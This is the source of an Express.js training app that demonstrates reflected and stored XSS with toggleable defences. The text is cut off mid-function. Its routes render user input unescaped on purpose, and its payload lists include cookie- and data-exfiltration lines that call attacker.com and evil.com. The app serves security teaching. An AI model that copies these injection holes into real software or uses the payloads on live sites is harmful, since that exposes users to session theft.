const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const app = express();
const PORT = process.env.PORT || 3000;

const db = new sqlite3.Database('./xss_demo.db');

db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS comments (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    content TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
});

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static('public'));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

const wafPatterns = [
  /<script[\s\S]*?>[\s\S]*?<\/script>/gi,
  /javascript:/gi,
  /on\w+\s*=/gi,
  /<iframe/gi,
  /<object/gi,
  /<embed/gi
];

function wafMiddleware(req, res, next) {
  const wafEnabled = req.query.waf === 'true' || req.body.waf === 'true';
  
  if (wafEnabled) {
    const checkData = JSON.stringify(req.query) + JSON.stringify(req.body);
    
    for (const pattern of wafPatterns) {
      if (pattern.test(checkData)) {
        return res.status(403).send(`
          <html>
            <head>
              <title>WAF Blocked</title>
              <style>
                body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
                .blocked { background: #ffebee; border: 2px solid #c62828; padding: 20px; border-radius: 5px; }
                h1 { color: #c62828; }
                a { color: #1976d2; }
              </style>
            </head>
            <body>
              <div class="blocked">
                <h1>🛡️ Request Blocked by WAF</h1>
                <p>Your request was blocked by the Web Application Firewall because it contains potentially malicious content.</p>
                <p>Pattern detected: ${pattern}</p>
                <p><a href="javascript:history.back()">Go Back</a></p>
              </div>
            </body>
          </html>
        `);
      }
    }
  }
  
  next();
}

function cspMiddleware(req, res, next) {
  const cspEnabled = req.query.csp || req.body.csp || 'none';
  
  if (cspEnabled !== 'none') {
    let cspValue = '';
    
    switch (cspEnabled) {
      case 'strict':
        cspValue = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none';";
        break;
      case 'nonce':
        const nonce = Math.random().toString(36).substring(2, 15);
        req.nonce = nonce;
        cspValue = `default-src 'self'; script-src 'nonce-${nonce}'; style-src 'self' 'unsafe-inline'; object-src 'none';`;
        break;
      case 'unsafe-inline':
        cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';";
        break;
      case 'unsafe-eval':
        cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';";
        break;
      case 'no-unsafe':
        cspValue = "default-src 'self'; script-src 'self'; style-src 'self'; object-src 'none';";
        break;
      case 'strict-dynamic':
        cspValue = "default-src 'self'; script-src 'strict-dynamic' 'nonce-xyz' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; object-src 'none';";
        break;
      case 'block-all-scripts':
        cspValue = "default-src 'self'; script-src 'none'; style-src 'self' 'unsafe-inline'; object-src 'none';";
        break;
      case 'block-inline-only':
        cspValue = "default-src 'self'; script-src 'self'; style-src 'self'; object-src 'none';";
        break;
      case 'block-exfiltration':
        cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'none'; form-action 'self'; base-uri 'self'; object-src 'none';";
        break;
      case 'allow-self-only':
        cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self'; form-action 'self'; base-uri 'self'; object-src 'none';";
        break;
      case 'block-requests':
        cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'none'; form-action 'self'; img-src 'self' data:; object-src 'none';";
        break;
      case 'block-forms':
        cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; form-action 'none'; base-uri 'none'; object-src 'none';";
        break;
      case 'block-plugins':
        cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; object-src 'none'; frame-src 'none';";
        break;
      case 'block-framing':
        cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none';";
        break;
      case 'block-base-uri':
        cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; base-uri 'none';";
        break;
      case 'upgrade-insecure':
        cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; upgrade-insecure-requests;";
        break;
      case 'report-only':
        cspValue = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; report-uri /csp-report;";
        res.setHeader('Content-Security-Policy-Report-Only', cspValue);
        next();
        return;
      case 'paranoid':
        cspValue = "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none';";
        break;
    }
    
    if (cspValue) {
      res.setHeader('Content-Security-Policy', cspValue);
    }
  }
  
  next();
}

function outputEncode(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

function validateInput(input) {
  const dangerous = /<|>|script|javascript:|on\w+=/i.test(input);
  return !dangerous;
}

app.use(wafMiddleware);
app.use(cspMiddleware);

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/reflected', (req, res) => {
  const clientValidation = req.query.clientValidation === 'true';
  const serverValidation = req.query.serverValidation === 'true';
  const encoding = req.query.encoding === 'true';
  const waf = req.query.waf === 'true';
  const csp = req.query.csp || 'none';
  const cookieFlags = req.query.cookieFlags === 'true';
  
  let userInput = req.query.input || '';
  
  if (serverValidation && userInput && !validateInput(userInput)) {
    return res.status(400).send(`
      <html>
        <head>
          <title>Server Validation Failed</title>
          <link rel="stylesheet" href="/styles.css">
        </head>
        <body>
          <div class="container">
            <div class="error-box">
              <h1>⚠️ Server Validation Failed</h1>
              <p>The input contains potentially dangerous content and was rejected by server-side validation.</p>
              <p><a href="/reflected">Go Back</a></p>
            </div>
          </div>
        </body>
      </html>
    `);
  }
  
  const displayInput = encoding ? outputEncode(userInput) : userInput;
  
  if (cookieFlags) {
    res.cookie('session', 'demo-session-123', {
      httpOnly: true,
      secure: false,
      sameSite: 'strict'
    });
  } else {
    res.cookie('session', 'demo-session-123');
  }
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Reflected XSS Demo</title>
      <link rel="stylesheet" href="/styles.css">
    </head>
    <body>
      <div class="container">
        <a href="/" class="home-button">🏠 Home</a>
        <h1>Reflected XSS Demo</h1>
        
        <div class="info-box">
          <h3>About Reflected XSS</h3>
          <p>Reflected XSS occurs when user input is immediately returned in the response without proper sanitization. The malicious script is "reflected" off the web server.</p>
          <p><strong>Attack Vector:</strong> GET parameter in URL</p>
        </div>

        <fieldset>
          <legend>Security Controls Configuration</legend>
          
          <div class="control-group">
            <label>
              <input type="checkbox" id="clientValidationCheck" ${clientValidation ? 'checked' : ''}>
              Client-Side Validation
            </label>
            <label>
              <input type="checkbox" id="serverValidationCheck" ${serverValidation ? 'checked' : ''}>
              Server-Side Validation
            </label>
            <label>
              <input type="checkbox" id="encodingCheck" ${encoding ? 'checked' : ''}>
              Output Encoding
            </label>
            <label>
              <input type="checkbox" id="wafCheck" ${waf ? 'checked' : ''}>
              WAF Protection
            </label>
            <label>
              <input type="checkbox" id="cookieFlagsCheck" ${cookieFlags ? 'checked' : ''}>
              Secure Cookie Flags
            </label>
          </div>

          <div class="control-group">
            <label for="cspSelect">Content Security Policy:</label>
            <select id="cspSelect">
              <optgroup label="🚫 No Protection">
                <option value="none" ${csp === 'none' ? 'selected' : ''}>None - No CSP (XSS executes freely)</option>
              </optgroup>
              <optgroup label="⚠️ Weak/Vulnerable Policies">
                <option value="unsafe-inline" ${csp === 'unsafe-inline' ? 'selected' : ''}>Allow unsafe-inline - Permits inline scripts (bypasses XSS protection)</option>
                <option value="unsafe-eval" ${csp === 'unsafe-eval' ? 'selected' : ''}>Allow unsafe-eval - Permits eval() and new Function() (dangerous)</option>
              </optgroup>
              <optgroup label="✅ Strong Script Blocking">
                <option value="strict" ${csp === 'strict' ? 'selected' : ''}>Strict - Only scripts from same origin (blocks inline XSS)</option>
                <option value="nonce" ${csp === 'nonce' ? 'selected' : ''}>Nonce-based - Requires unique token per script (best for inline)</option>
                <option value="strict-dynamic" ${csp === 'strict-dynamic' ? 'selected' : ''}>Strict-Dynamic - Trusts dynamically loaded scripts from trusted sources</option>
                <option value="no-unsafe" ${csp === 'no-unsafe' ? 'selected' : ''}>No Unsafe - Blocks inline scripts & eval (strong protection)</option>
                <option value="block-all-scripts" ${csp === 'block-all-scripts' ? 'selected' : ''}>Block All Scripts - script-src 'none' (maximum protection)</option>
                <option value="block-inline-only" ${csp === 'block-inline-only' ? 'selected' : ''}>Block Inline Only - Allows external scripts, blocks inline</option>
              </optgroup>
              <optgroup label="🛡️ Post-Exploitation Mitigation">
                <option value="block-exfiltration" ${csp === 'block-exfiltration' ? 'selected' : ''}>Block Data Exfiltration - Blocks fetch/XHR, allows same-origin forms</option>
                <option value="allow-self-only" ${csp === 'allow-self-only' ? 'selected' : ''}>Allow Self Only - All requests restricted to same origin</option>
                <option value="block-requests" ${csp === 'block-requests' ? 'selected' : ''}>Block External Requests - Blocks fetch/XHR, allows forms</option>
                <option value="block-forms" ${csp === 'block-forms' ? 'selected' : ''}>Block ALL Forms - form-action 'none' (extreme, breaks this page)</option>
              </optgroup>
              <optgroup label="🎯 Attack Surface Reduction">
                <option value="block-plugins" ${csp === 'block-plugins' ? 'selected' : ''}>Block Plugins - Prevents Flash/Java exploits (object-src 'none')</option>
                <option value="block-framing" ${csp === 'block-framing' ? 'selected' : ''}>Block Framing - Prevents clickjacking (frame-ancestors 'none')</option>
                <option value="block-base-uri" ${csp === 'block-base-uri' ? 'selected' : ''}>Block Base URI - Prevents base tag injection attacks</option>
                <option value="upgrade-insecure" ${csp === 'upgrade-insecure' ? 'selected' : ''}>Upgrade Insecure - Forces HTTPS for all resources</option>
              </optgroup>
              <optgroup label="🔬 Testing & Extreme">
                <option value="report-only" ${csp === 'report-only' ? 'selected' : ''}>Report-Only - Logs violations without blocking (for testing)</option>
                <option value="paranoid" ${csp === 'paranoid' ? 'selected' : ''}>Paranoid Mode - Maximum security, blocks almost everything</option>
              </optgroup>
            </select>
          </div>

          <button type="button" onclick="applySecurityControls()" class="apply-controls-btn">🔄 Apply Security Controls</button>
        </fieldset>

        <form method="GET" action="/reflected" id="payloadForm">
          <fieldset>
            <legend>User Input</legend>
            <input type="text" name="input" id="userInput" placeholder="Enter text to reflect..." value="${outputEncode(userInput)}">
            <button type="submit">Submit Payload</button>
          </fieldset>
        </form>

        ${userInput ? `
          <div class="output-box">
            <h3>Reflected Output:</h3>
            <div class="output-content">
              ${displayInput}
            </div>
            ${encoding ? `
              <div style="margin-top: 15px; padding: 15px; background: #e8f5e9; border-radius: 5px; border-left: 4px solid #4caf50;">
                <strong style="color: #2e7d32;">✅ Output Encoding Active</strong>
                <p style="margin: 10px 0 5px 0; color: #555;">Raw HTML sent to browser (with entities):</p>
                <pre style="background: #fff; padding: 10px; border-radius: 3px; overflow-x: auto; font-family: monospace; font-size: 0.9em;"><code>${outputEncode(outputEncode(userInput))}</code></pre>
                <p style="margin: 5px 0 0 0; color: #555; font-size: 0.9em;">The browser automatically decodes HTML entities for display, so you see the original text above, but the code cannot execute.</p>
              </div>
            ` : ''}
          </div>
        ` : ''}

        <div class="example-box">
          <h3>Try These Payloads:</h3>
          <p><strong>Basic XSS (Script Execution):</strong></p>
          <ul>
            <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
            <li><code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>
            <li><code>&lt;svg onload=alert('XSS')&gt;</code></li>
            <li><code>&lt;iframe src="javascript:alert('XSS')"&gt;</code></li>
          </ul>
          <p><strong>Post-Exploitation (Data Exfiltration):</strong></p>
          <ul>
            <li><code>&lt;script&gt;fetch('https://attacker.com?cookie='+document.cookie)&lt;/script&gt;</code> - Cookie theft via fetch</li>
            <li><code>&lt;img src=x onerror=fetch('https://evil.com?data='+btoa(document.body.innerHTML))&gt;</code> - Page data exfiltration</li>
            <li><code>&lt;script&gt;new Image().src='https://attacker.com?session='+document.cookie&lt;/script&gt;</code> - Session hijacking via image</li>
            <li><code>&lt;script&gt;document.location='https://attacker.com?cookie='+document.cookie&lt;/script&gt;</code> - Redirect with data</li>
          </ul>
          <p><strong>Session Riding (CSRF-like):</strong></p>
          <ul>
            <li><code>&lt;script&gt;fetch('/admin/delete',{method:'POST'})&lt;/script&gt;</code> - Unauthorized action</li>
            <li><code>&lt;form action="https://attacker.com" method="POST"&gt;&lt;input name="data" value="stolen"&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code> - Form-based exfiltration</li>
          </ul>
        </div>

        <div class="active-controls">
          <h3>Active Security Controls:</h3>
          <ul>
            <li>Client-Side Validation: <strong>${clientValidation ? '✅ Enabled' : '❌ Disabled'}</strong></li>
            <li>Server-Side Validation: <strong>${serverValidation ? '✅ Enabled' : '❌ Disabled'}</strong></li>
            <li>Output Encoding: <strong>${encoding ? '✅ Enabled' : '❌ Disabled'}</strong></li>
            <li>WAF: <strong>${waf ? '✅ Enabled' : '❌ Disabled'}</strong></li>
            <li>CSP: <strong>${csp !== 'none' ? '✅ ' + csp : '❌ Disabled'}</strong></li>
            <li>Secure Cookies: <strong>${cookieFlags ? '✅ Enabled' : '❌ Disabled'}</strong></li>
          </ul>
        </div>

        <p><a href="/" class="back-link">← Back to Home</a></p>
      </div>

      <script>
        function applySecurityControls() {
          const params = new URLSearchParams();
          
          if (document.getElementById('clientValidationCheck').checked) params.set('clientValidation', 'true');
          if (document.getElementById('serverValidationCheck').checked) params.set('serverValidation', 'true');
          if (document.getElementById('encodingCheck').checked) params.set('encoding', 'true');
          if (document.getElementById('wafCheck').checked) params.set('waf', 'true');
          if (document.getElementById('cookieFlagsCheck').checked) params.set('cookieFlags', 'true');
          
          const csp = document.getElementById('cspSelect').value;
          if (csp !== 'none') params.set('csp', csp);
          
          window.location.href = '/reflected?' + params.toString();
        }

        ${clientValidation ? `
        const userInputField = document.getElementById('userInput');
        const payloadForm = document.getElementById('payloadForm');
        const userInputFieldset = userInputField.closest('fieldset');
        let errorMessage = null;
        
        function showValidationError(message) {
          userInputField.classList.add('validation-error');
          userInputFieldset.classList.add('validation-error');
          
          if (!errorMessage) {
            errorMessage = document.createElement('div');
            errorMessage.className = 'error-message';
            userInputFieldset.insertBefore(errorMessage, userInputField.nextSibling);
          }
          errorMessage.textContent = message;
          
          setTimeout(() => {
            userInputField.classList.remove('validation-error');
            userInputFieldset.classList.remove('validation-error');
          }, 3000);
        }
        
        function clearValidationError() {
          userInputField.classList.remove('validation-error');
          userInputFieldset.classList.remove('validation-error');
          if (errorMessage) {
            errorMessage.remove();
            errorMessage = null;
          }
        }
        
        userInputField.addEventListener('input', function(e) {
          const input = e.target.value;
          const dangerous = /<|>/.test(input);
          
          if (!dangerous) {
            clearValidationError();
          }
        });
        
        payloadForm.addEventListener('submit', function(e) {
          const input = userInputField.value;
          const dangerous = /<|>/.test(input);
          
          if (dangerous) {
            e.preventDefault();
            showValidationError('Client-Side Validation: Input contains dangerous characters (< or >)');
            return false;
          }
          
          const params = new URLSearchParams();
          if (document.getElementById('clientValidationCheck').checked) params.set('clientValidation', 'true');
          if (document.getElementById('serverValidationCheck').checked) params.set('serverValidation', 'true');
          if (document.getElementById('encodingCheck').checked) params.set('encoding', 'true');
          if (document.getElementById('wafCheck').checked) params.set('waf', 'true');
          if (document.getElementById('cookieFlagsCheck').checked) params.set('cookieFlags', 'true');
          const csp = document.getElementById('cspSelect').value;
          if (csp !== 'none') params.set('csp', csp);
          params.set('input', input);
          
          window.location.href = '/reflected?' + params.toString();
          e.preventDefault();
        });
        ` : `
        const userInputField = document.getElementById('userInput');
        const payloadForm = document.getElementById('payloadForm');
        
        payloadForm.addEventListener('submit', function(e) {
          const input = userInputField.value;
          const params = new URLSearchParams();
          if (document.getElementById('clientValidationCheck').checked) params.set('clientValidation', 'true');
          if (document.getElementById('serverValidationCheck').checked) params.set('serverValidation', 'true');
          if (document.getElementById('encodingCheck').checked) params.set('encoding', 'true');
          if (document.getElementById('wafCheck').checked) params.set('waf', 'true');
          if (document.getElementById('cookieFlagsCheck').checked) params.set('cookieFlags', 'true');
          const csp = document.getElementById('cspSelect').value;
          if (csp !== 'none') params.set('csp', csp);
          params.set('input', input);
          
          window.location.href = '/reflected?' + params.toString();
          e.preventDefault();
        });
        `}
      </script>
    </body>
    </html>
  `);
});

app.get('/stored', (req, res) => {
  const clientValidation = req.query.clientValidation === 'true';
  const serverValidation = req.query.serverValidation === 'true';
  const encoding = req.query.encoding === 'true';
  const waf = req.query.waf === 'true';
  const csp = req.query.csp || 'none';
  const cookieFlags = req.query.cookieFlags === 'true';
  
  if (cookieFlags) {
    res.cookie('session', 'demo-session-456', {
      httpOnly: true,
      secure: false,
      sameSite: 'strict'
    });
  } else {
    res.cookie('session', 'demo-session-456');
  }
  
  db.all('SELECT * FROM comments ORDER BY created_at DESC LIMIT 20', [], (err, rows) => {
    if (err) {
      return res.status(500).send('Database error');
    }
    
    const comments = rows.map(row => {
      const displayContent = encoding ? outputEncode(row.content) : row.content;
      const commentHtml = `
        <div class="comment" style="margin-bottom: 15px; padding: 15px; background: #f9f9f9; border-radius: 5px; border-left: 3px solid #3f51b5;">
          <div class="comment-content">${displayContent}</div>
          ${encoding ? `
            <div style="margin-top: 10px; padding: 10px; background: #e8f5e9; border-radius: 3px; font-size: 0.85em;">
              <strong style="color: #2e7d32;">✅ Encoded HTML:</strong>
              <code style="background: #fff; padding: 2px 6px; border-radius: 2px; font-family: monospace; display: inline-block; margin-left: 5px;">${outputEncode(outputEncode(row.content))}</code>
            </div>
          ` : ''}
        </div>
      `;
      return commentHtml;
    }).join('');
    
    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Stored XSS Demo</title>
        <link rel="stylesheet" href="/styles.css">
      </head>
      <body>
        <div class="container">
          <a href="/" class="home-button">🏠 Home</a>
          <h1>Stored XSS Demo</h1>
          
          <div class="info-box">
            <h3>About Stored XSS</h3>
            <p>Stored XSS (Persistent XSS) occurs when malicious input is saved to a database and then displayed to users. This is often more dangerous as it affects multiple users.</p>
            <p><strong>Attack Vector:</strong> POST request storing data in database</p>
          </div>

          <fieldset>
            <legend>Security Controls Configuration</legend>
            
            <div class="control-group">
              <label>
                <input type="checkbox" id="clientValidationCheck" ${clientValidation ? 'checked' : ''}>
                Client-Side Validation
              </label>
              <label>
                <input type="checkbox" id="serverValidationCheck" ${serverValidation ? 'checked' : ''}>
                Server-Side Validation
              </label>
              <label>
                <input type="checkbox" id="encodingCheck" ${encoding ? 'checked' : ''}>
                Output Encoding
              </label>
              <label>
                <input type="checkbox" id="wafCheck" ${waf ? 'checked' : ''}>
                WAF Protection
              </label>
              <label>
                <input type="checkbox" id="cookieFlagsCheck" ${cookieFlags ? 'checked' : ''}>
                Secure Cookie Flags
              </label>
            </div>

            <div class="control-group">
              <label for="cspSelect">Content Security Policy:</label>
              <select id="cspSelect">
                <optgroup label="🚫 No Protection">
                  <option value="none" ${csp === 'none' ? 'selected' : ''}>None - No CSP (XSS executes freely)</option>
                </optgroup>
                <optgroup label="⚠️ Weak/Vulnerable Policies">
                  <option value="unsafe-inline" ${csp === 'unsafe-inline' ? 'selected' : ''}>Allow unsafe-inline - Permits inline scripts (bypasses XSS protection)</option>
                  <option value="unsafe-eval" ${csp === 'unsafe-eval' ? 'selected' : ''}>Allow unsafe-eval - Permits eval() and new Function() (dangerous)</option>
                </optgroup>
                <optgroup label="✅ Strong Script Blocking">
                  <option value="strict" ${csp === 'strict' ? 'selected' : ''}>Strict - Only scripts from same origin (blocks inline XSS)</option>
                  <option value="nonce" ${csp === 'nonce' ? 'selected' : ''}>Nonce-based - Requires unique token per script (best for inline)</option>
                  <option value="strict-dynamic" ${csp === 'strict-dynamic' ? 'selected' : ''}>Strict-Dynamic - Trusts dynamically loaded scripts from trusted sources</option>
                  <option value="no-unsafe" ${csp === 'no-unsafe' ? 'selected' : ''}>No Unsafe - Blocks inline scripts & eval (strong protection)</option>
                  <option value="block-all-scripts" ${csp === 'block-all-scripts' ? 'selected' : ''}>Block All Scripts - script-src 'none' (maximum protection)</option>
                  <option value="block-inline-only" ${csp === 'block-inline-only' ? 'selected' : ''}>Block Inline Only - Allows external scripts, blocks inline</option>
                </optgroup>
                <optgroup label="🛡️ Post-Exploitation Mitigation">
                  <option value="block-exfiltration" ${csp === 'block-exfiltration' ? 'selected' : ''}>Block Data Exfiltration - Blocks fetch/XHR, allows same-origin forms</option>
                  <option value="allow-self-only" ${csp === 'allow-self-only' ? 'selected' : ''}>Allow Self Only - All requests restricted to same origin</option>
                  <option value="block-requests" ${csp === 'block-requests' ? 'selected' : ''}>Block External Requests - Blocks fetch/XHR, allows forms</option>
                  <option value="block-forms" ${csp === 'block-forms' ? 'selected' : ''}>Block ALL Forms - form-action 'none' (extreme, breaks this page)</option>
                </optgroup>
                <optgroup label="🎯 Attack Surface Reduction">
                  <option value="block-plugins" ${csp === 'block-plugins' ? 'selected' : ''}>Block Plugins - Prevents Flash/Java exploits (object-src 'none')</option>
                  <option value="block-framing" ${csp === 'block-framing' ? 'selected' : ''}>Block Framing - Prevents clickjacking (frame-ancestors 'none')</option>
                  <option value="block-base-uri" ${csp === 'block-base-uri' ? 'selected' : ''}>Block Base URI - Prevents base tag injection attacks</option>
                  <option value="upgrade-insecure" ${csp === 'upgrade-insecure' ? 'selected' : ''}>Upgrade Insecure - Forces HTTPS for all resources</option>
                </optgroup>
                <optgroup label="🔬 Testing & Extreme">
                  <option value="report-only" ${csp === 'report-only' ? 'selected' : ''}>Report-Only - Logs violations without blocking (for testing)</option>
                  <option value="paranoid" ${csp === 'paranoid' ? 'selected' : ''}>Paranoid Mode - Maximum security, blocks almost everything</option>
                </optgroup>
              </select>
            </div>

            <button type="button" onclick="applySecurityControls()" class="apply-controls-btn">🔄 Apply Security Controls</button>
          </fieldset>

          <form method="POST" action="/stored/comment" id="commentForm">
            <fieldset>
              <legend>Add Comment</legend>
              <textarea name="comment" id="commentInput" placeholder="Enter your comment..." rows="4"></textarea>
              <button type="submit">Post Comment</button>
              <button type="button" onclick="clearComments()">Clear All Comments</button>
            </fieldset>
          </form>

          ${['block-forms', 'paranoid'].includes(csp) ? `
            <div style="margin: 20px 0; padding: 15px; background: #ffebee; border-radius: 5px; border-left: 4px solid #f44336;">
              <strong style="color: #c62828;">🚫 CSP Note: ALL Form Submissions Blocked</strong>
              <p style="margin: 10px 0 0 0; color: #555; font-size: 0.9em;">
                The current CSP (<code>${csp}</code>) uses <code>form-action 'none'</code> which blocks ALL form submissions (including to same origin). 
                <strong>Comment submission is disabled</strong> to demonstrate this extreme security control.
              </p>
              <p style="margin: 10px 0 0 0; color: #555; font-size: 0.9em;">
                This CSP prevents attackers from:
              </p>
              <ul style="margin: 10px 0 0 20px; color: #555; font-size: 0.9em;">
                <li>Submitting stolen data to external attacker-controlled servers</li>
                <li>Creating hidden forms that POST credentials to phishing sites</li>
                <li>Session riding (CSRF-like) attacks via form injection</li>
              </ul>
              <p style="margin: 10px 0 0 0; color: #555; font-size: 0.9em;">
                ⚠️ <strong>Too restrictive for most apps!</strong> In production, use <code>form-action 'self'</code> to allow same-origin forms.
              </p>
            </div>
          ` : ['block-exfiltration', 'block-requests'].includes(csp) ? `
            <div style="margin: 20px 0; padding: 15px; background: #fff3e0; border-radius: 5px; border-left: 4px solid #ff9800;">
              <strong style="color: #e65100;">⚠️ CSP Note: Fetch/XHR Blocked, Forms Allowed</strong>
              <p style="margin: 10px 0 0 0; color: #555; font-size: 0.9em;">
                The current CSP (<code>${csp}</code>) blocks <code>fetch()</code> and <code>XMLHttpRequest()</code> with <code>connect-src 'none'</code>, but allows same-origin forms with <code>form-action 'self'</code>. 
                This app automatically falls back to traditional form submission.
              </p>
              <p style="margin: 10px 0 0 0; color: #555; font-size: 0.9em;">
                <strong>This CSP prevents:</strong>
              </p>
              <ul style="margin: 10px 0 0 20px; color: #555; font-size: 0.9em;">
                <li>✅ Attackers from exfiltrating data via fetch() to external servers</li>
                <li>✅ XSS payloads from making AJAX calls to steal session tokens</li>
                <li>✅ External form submissions to attacker-controlled sites</li>
                <li>❌ Same-origin API calls (may break modern SPAs)</li>
              </ul>
              <p style="margin: 10px 0 0 0; color: #555; font-size: 0.9em;">
                <strong>Check the console</strong> to see the CSP-aware fallback in action.
              </p>
            </div>
          ` : ''}

          <div class="output-box">
            <h3>Comments:</h3>
            <div id="comments" class="comments-list">
              ${comments || '<p style="padding: 20px; text-align: center; color: #777;">No comments yet. Be the first to comment!</p>'}
            </div>
            ${encoding && comments ? `
              <div style="margin-top: 15px; padding: 15px; background: #e3f2fd; border-radius: 5px; border-left: 4px solid #2196f3;">
                <strong style="color: #1565c0;">ℹ️ About Output Encoding</strong>
                <p style="margin: 10px 0 0 0; color: #555; font-size: 0.9em;">
                  Output encoding converts dangerous characters like <code>&lt;</code> to HTML entities like <code>&amp;lt;</code>. 
                  This prevents the browser from interpreting malicious code as executable HTML/JavaScript.
                </p>
              </div>
            ` : ''}
          </div>

          <div class="example-box">
            <h3>Try These Payloads:</h3>
            <p><strong>Basic XSS (Script Execution):</strong></p>
            <ul>
              <li><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
              <li><code>&lt;img src=x onerror=alert('Stored XSS')&gt;</code></li>
              <li><code>&lt;svg/onload=alert('Persistent')&gt;</code></li>
              <li><code>&lt;body onload=alert('XSS')&gt;</code></li>
            </ul>
            <p><strong>Post-Exploitation (More Dangerous - Persistent):</strong></p>
            <ul>
              <li><code>&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</code> - Steals every visitor's cookies</li>
              <li><code>&lt;img src=x onerror="navigator.sendBeacon('https://evil.com',document.cookie)"&gt;</code> - Beacon-based exfiltration</li>
              <li><code>&lt;script&gt;setInterval(()=&gt;fetch('https://attacker.com/log?page='+location.href),5000)&lt;/script&gt;</code> - Track all visitors</li>
            </ul>
          </div>

          <div class="active-controls">
            <h3>Active Security Controls:</h3>
            <ul>
              <li>Client-Side Validation: <strong>${clientValidation ? '✅ Enabled' : '❌ Disabled'}</strong></li>
              <li>Server-Side Validation: <strong>${serverValidation ? '✅ Enabled' : '❌ Disabled'}</strong></li>
              <li>Output Encoding: <strong>${encoding ? '✅ Enabled' : '❌ Disabled'}</strong></li>
              <li>WAF: <strong>${waf ? '✅ Enabled' : '❌ Disabled'}</strong></li>
              <li>CSP: <strong>${csp !== 'none' ? '✅ ' + csp : '❌ Disabled'}</strong></li>
              <li>Secure Cookies: <strong>${cookieFlags ? '✅ Enabled' : '❌ Disabled'}</strong></li>
            </ul>
          </div>

          <p><a href="/" class="back-link">← Back to Home</a></p>
        </div>

        <script>
          function applySecurityControls() {
            const params = new URLSearchParams();
            
            if (document.getElementById('clientValidationCheck').checked) params.set('clientValidation', 'true');
            if (document.getElementById('serverValidationCheck').checked) params.set('serverValidation', 'true');
            if (document.getElementById('encodingCheck').checked) params.set('encoding', 'true');
            if (document.getElementById('wafCheck').checked) params.set('waf', 'true');
            if (document.getElementById('cookieFlagsCheck').checked) params.set('cookieFlags', 'true');
            
            const csp = document.getElementById('cspSelect').value;
            if (csp !== 'none') params.set('csp', csp);
            
            window.location.href = '/stored?' + params.toString();
          }

          function clearComments() {
            if (confirm('Are you sure you want to clear all comments?')) {
              const params = new URLSearchParams(window.location.search);
              fetch('/stored/clear', { method: 'POST' })
                .then(() => window.location.href = '/stored?' + params.toString());
            }
          }

          ${clientValidation ? `
          const commentInputField = document.getElementById('commentInput');
          const commentForm = document.getElementById('commentForm');
          const commentFieldset = commentInputField.closest('fieldset');
          let commentErrorMessage = null;
          
          function showCommentValidationError(message) {
            commentInputField.classList.add('validation-error');
            commentFieldset.classList.add('validation-error');
            
            if (!commentErrorMessage) {
              commentErrorMessage = document.createElement('div');
              commentErrorMessage.className = 'error-message';
              commentFieldset.insertBefore(commentErrorMessage, commentInputField.nextSibling);
            }
            commentErrorMessage.textContent = message;
            
            setTimeout(() => {
              commentInputField.classList.remove('validation-error');
              commentFieldset.classList.remove('validation-error');
            }, 3000);
          }
          
          function clearCommentValidationError() {
            commentInputField.classList.remove('validation-error');
            commentFieldset.classList.remove('validation-error');
            if (commentErrorMessage) {
              commentErrorMessage.remove();
              commentErrorMessage = null;
            }
          }
          
          commentInputField.addEventListener('input', function(e) {
            const input = e.target.value;
            const dangerous = /<|>/.test(input);
            
            if (!dangerous) {
              clearCommentValidationError();
            }
          });
          
          commentForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const input = commentInputField.value;
            const dangerous = /<|>/.test(input);
            
            if (dangerous) {
              showCommentValidationError('Client-Side Validation: Input contains dangerous characters (< or >)');
              return false;
            }
            
            submitComment(input);
          });
          ` : `
          const commentInputField = document.getElementById('commentInput');
          const commentForm = document.getElementById('commentForm');
          
          commentForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const input = commentInputField.value;
            submitComment(input);
          });
          `}
          
          function submitComment(comment) {
            const params = new URLSearchParams();
            if (document.getElementById('clientValidationCheck').checked) params.set('clientValidation', 'true');
